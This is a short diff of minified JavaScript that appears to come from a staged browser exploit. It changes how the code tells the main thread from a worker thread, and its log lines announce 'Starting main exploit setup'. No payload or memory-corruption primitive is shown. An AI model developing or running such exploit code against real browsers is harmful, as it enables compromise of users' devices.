@@ -1495,12 +1495,13 @@ async function q(t, e) {
       return this.en.getBigUint64(0, true);
     }
   }
-  if (navigator.constructor.name === "Navigator") {
+  if (typeof window !== "undefined" && typeof window.log === "function") {
+    // Main thread (has window object)
     et();
     window.log("[STAGE1] >>> Starting main exploit setup (ht)");
     ht(t);
   } else {
-    // Worker thread code
+    // Worker thread (self object, no window)
     try {
       self.postMessage({ type: 0, msg: "worker_else_block_reached" });
       self.onmessage = (t) => {
